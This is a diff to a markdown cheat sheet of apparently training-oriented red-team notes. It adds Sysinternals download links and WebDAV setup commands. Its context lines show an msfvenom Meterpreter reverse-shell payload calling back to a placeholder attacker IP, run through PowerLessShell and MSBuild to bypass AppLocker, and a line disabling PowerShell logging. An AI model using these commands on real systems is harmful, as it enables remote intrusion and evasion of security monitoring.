@@ -28,8 +28,18 @@
 - [Bypass Applocker](#bypass-applocker)
 
 # Sysinternals
-- [THM Sysinternals](https://tryhackme.com/room/btsysinternalssg)
 - [LOLBAS](https://lolbas-project.github.io/#)
+- [Where Download](https://learn.microsoft.com/en-us/sysinternals/downloads/)
+- [Where Download 2](https://live.sysinternals.com/)
+- Download
+  - Method 1
+    - get-service webclient && start-service webclient ==> run webclient
+    - control.exe /name Microsoft.NetworkAndSharingCenter ==> turn on network discovery
+    - Install-WindowsFeature WebDAV-Redirector -Restart
+    - Get-WindowsFeature WebDAV-Redirector | Format-Table -Autosize
+  - Method 2
+    - net use * \\live.sysinternals.com\tools\procmon.exe
+  - \\live.sysinternals.com\tools\procmon.exe
 - Process analyser
   - Procmon, Process Explorer, Process Hacker 2
 - DLL
@@ -659,6 +669,8 @@ $snap.LogPipelineExecutionDetails = $false
   - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
   - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
   - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+
+
 
 # Bypass Applocker
 - Applocker: restrict programs from being executed
